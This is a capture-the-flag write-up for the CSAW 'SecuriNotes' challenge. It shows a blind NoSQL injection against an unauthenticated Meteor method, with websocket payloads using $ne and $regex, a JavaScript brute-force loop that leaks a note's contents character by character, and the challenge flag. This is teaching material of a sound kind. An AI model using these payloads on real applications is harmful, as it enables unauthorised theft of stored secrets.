---
description: Meteor NoSQL Injection
---

# securinotes

## Description

You have access to the `SecuriNotes` application. You overheard your coworker Terry talking about how he uses it as a password manager. What could possibly go wrong...

Author: `h34d4ch3`, RangeForce

http://web.chal.csaw.io:5002

## Solution

In the front-end JavaScript source code, we can see that Meteor is being used to fetch data from a MongoDB backend.

First, let's find all the exposed Meteor methods. We can see that `notes.count`, `notes.add` and `notes.remove` are publically callable methods.

```javascript
Meteor.methods({
  'notes.count': function (filter) {
    return Notes.find(filter).count();
  },
  'notes.add': function () {
    let user = this.userId;

    if (!user) {
      throw new Meteor.Error('not-authorized', "You are not logged in.");
    }

    return Notes.insert({
      body: "### Title\n\nNew note\n\nCreated at " + new Date().toLocaleString(),
      owner: user
    });
  },
  'notes.remove': function (id) {
    let user = this.userId;

    if (!user) {
      throw new Meteor.Error('not-authorized', "You are not logged in.");
    }

    return Notes.remove({
      _id: id,
      owner: this.userId
    });
  }
});
```

In particular, though, `notes.count` is unauthenticated. Let's start there! From the above code, it seems like `notes.count` applies some kind of filter and the backend server returns the number of notes that pass the filter.

In Burp Suite, I found that this method was being called through websockets. Upon connecting to the webpage, this was being sent to the server: 

`["{\"msg\":\"method\",\"method\":\"notes.count\",\"params\":[{\"body\":{\"$ne\":\"\"}}],\"id\":\"1\"}"]`

The `$ne` filter checks whether the body of the notes is not equal to an empty string. After a bit of fiddling, I found that `$regex` was accepted too. This allows us to specify a regex pattern for the note contents. To verify, I checked that the following only returned one result:

`["{\"msg\":\"method\",\"method\":\"notes.count\",\"params\":[{\"body\":{\"$regex\":\"flag{.*}\"}}],\"id\":\"1\"}"]`

Here, we are checking for notes that match the regex pattern `flag{.*}`, which is the flag format. The result will be 1, because only one note contains the flag.

We could extend this to bruteforce every character of the flag. By appending each possible character at the end of the flag, we can check which character causes the count to return 1 \(the rest will return 0\).

```javascript
let curr = 'flag{';

const lowerAlph = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
const upperCaseAlp = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"];
const numbers = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
const charset = lowerAlph.concat(upperCaseAlp).concat(numbers).concat(["{", "}", "_"])
console.log(charset);

for (i = 0; i < charset.length; i++)
{
    let char = charset[i];
    console.log(char);

    Meteor.call('notes.count', {
        body: {
            $regex: curr + char + '.*'
        }
    }, function (err, res) {
        if (res !== 0)
        {
            console.log(char);
        }
    });
}
```

The flag is `flag{4lly0Urb4s3}`.

## References

* [https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01](https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01)

